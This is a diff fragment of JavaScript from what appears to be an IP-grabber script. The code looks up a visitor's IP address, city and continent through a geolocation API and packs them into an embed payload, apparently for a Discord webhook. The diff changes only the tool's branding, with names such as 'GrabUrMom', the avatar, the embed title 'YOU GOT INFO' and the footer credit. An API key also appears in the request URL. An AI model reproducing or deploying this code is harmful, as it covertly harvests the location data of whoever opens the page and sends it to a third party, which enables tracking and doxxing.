@@ -5,12 +5,12 @@ $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=4bce3e49c8304c3ab04
     request.setRequestHeader('Content-type', 'application/json');
   
     var t = {
-      username: "Idiot_Grabber",
-      avatar_url: "https://i.imgur.com/1h97XvJ_d.webp?maxwidth=760&fidelity=grand",
+      username: "GrabUrMom",
+      avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
       content: "",
       embeds: [{
-          color: "16711744",
-          title: "IDIOT INFO",
+          color: "4700374",
+          title: "YOU GOT INFO",
           fields: [
             {name: "IP", value: data.ip_address},
             {name: "CITY", value: data.city},
@@ -18,7 +18,7 @@ $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=4bce3e49c8304c3ab04
             {name: "CONTINENT", value: data.continent},
           ],
           footer: {
-              text: "By KSEJNEX | nie dla psa kielbasa"
+              text: "By KazUpTV | https://basedbot.cf"
           }
       }]
   };
